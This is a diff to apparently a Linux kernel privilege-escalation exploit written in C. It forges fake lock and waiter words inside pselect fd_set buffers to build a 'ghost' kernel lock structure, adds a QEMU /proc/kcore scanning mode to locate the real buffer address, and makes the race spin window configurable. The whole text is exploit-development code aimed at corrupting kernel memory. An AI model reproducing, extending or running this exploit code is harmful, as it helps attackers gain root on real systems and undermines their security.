@@ -639,6 +639,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           pselect_put_waiter_word(in, out, ex, words_per_set,
                                   lock_words[i].word, lock_words[i].value,
                                   lock_words[i].name);
+        { /* MAGIC (fdset word 14): /proc/kcore scan finds the REAL buffer
+           * address (QEMU root) → self-consistent ghost; device: anchor. */
+          pselect_put_waiter_word(in, out, ex, words_per_set, 14,
+                                  (uint64_t)PSELECT_MAGIC_WORD, "magic");
+        }
         pr_info("stack JC2 SELF-LOCK: ghost=%016llx lock=%016llx "
                 "root=leftmost=ghost owner=1 (delivery gate armed)\n",
                 (unsigned long long)g_ghost_kva,
@@ -650,6 +655,9 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               (unsigned long long)ghost_lock,
               (unsigned long long)ghost_prio);
       goto stack_words_done;
+    } else if (env_flag("QEMU_KCORE_SCAN", 0)) {
+      /* KCORE mode: NO setup-arm - consumer late-arms after scan. */
+      atomic_store(&punch_consume_go, 0);
     } else {
       uint64_t pi_parent = 0, pi_right = 0, pi_left = 0;
       /* word8 = init_task: its on_rq==1 makes the post-erase
@@ -2786,7 +2794,8 @@ void do_pselect_fake_lock_route(void) {
         clock_gettime(CLOCK_MONOTONIC, &spn);
         long el = (spn.tv_sec - sp0.tv_sec) * 1000000L +
                   (spn.tv_nsec - sp0.tv_nsec) / 1000;
-        if (el >= 150000L)
+        long win_us = env_int_range("SPIN_WINDOW_MS", 150, 1, 60000) * 1000L;
+        if (el >= win_us)
           break;
       }
       {
